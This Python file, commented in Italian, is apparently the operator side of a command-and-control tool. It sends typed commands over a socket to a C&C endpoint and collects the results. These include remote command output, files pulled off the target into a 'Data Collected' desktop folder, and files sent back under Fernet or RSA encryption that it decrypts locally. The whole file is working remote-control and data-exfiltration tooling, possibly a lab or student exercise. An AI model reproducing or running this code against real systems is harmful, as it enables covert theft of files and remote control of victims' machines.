import socket
import os
from cryptography.fernet import Fernet
import rsa

# Si connette al C&C 
HOST_CNC = 'localhost'
PORT_CNC = 6000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST_CNC, PORT_CNC))

# Funzioni
def gen_pk():
    publicKey, privateKey = rsa.newkeys(1024)
    return publicKey, privateKey

def send_pk():
    s.send(public_key.save_pkcs1(format='PEM'))
    
# Crea una cartella per salvare i file se non esiste
folder_path = os.path.join(os.path.expanduser("~"), "Desktop", "Data Collected")
os.makedirs(folder_path, exist_ok=True)
output_file = os.path.join(folder_path, "output.txt")

# Inizializza la chiave privata fuori dal ciclo
private_key = None

while True:
    # Invia il comando
    command = input("Write a command: ")
    s.send(command.encode())
    if command.strip().upper() == "STOP":
        break

    # Inizializzazione comando
    parts = command.split()
    cmd = parts[0].upper()
    
    # Inizializzazione chiavi
    sym_key = None
    private_key = None
    
    # Invia la chiave pubblica e crea la privata [CIFRATURA ASIMMETRICA]
    if cmd == "PKENC":
        public_key, private_key = gen_pk()
        send_pk()
    
    # Prepara a ricevere ACK e chiave in caso sia CIFRA
    if cmd == "CIFRA":
        sym_key = s.recv(4096)
        print("Symmetric key received.")
        
    # Riceve l'output
    output = s.recv(4096)
    
    # Ouput se il comando è INVIA
    if cmd == "INVIA":
        file_name = parts[1]
        filepath = os.path.join(folder_path, file_name)
        with open(filepath, "wb") as f:
            f.write(output)
            print(f"[FILE RECEIVED] File saved as: {filepath}")
            
    # Output se il comando è CIFRA
    elif cmd == "CIFRA":
        file_name = "enc_" + parts[1]
        filepath = os.path.join(folder_path, file_name)

        if sym_key is not None:
            fernet = Fernet(sym_key)
            sym_decrypted = fernet.decrypt(output)
            with open(filepath, "wb") as f:
                f.write(sym_decrypted)
                print(f"[DECRYPTED FILE] File saved as: {filepath}")
        else:
            print("[ERROR] Key has not been received.")
        
    # Output se il comando è PKENC
    elif cmd == "PKENC":
        new_header = "enc_" + parts[1]
        filepath = os.path.join(folder_path, new_header)
        if private_key is not None:
            asym_decrypted = rsa.decrypt(output, private_key)
            with open(filepath, "wb") as f:
                f.write(asym_decrypted)
                print(f"[ASYMMETRIC FILE] File saved as: {filepath}")
                  
    else:
        text = output.decode(errors="replace")
        print(text)
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(text)
        print("Textual output saved.")

s.close()
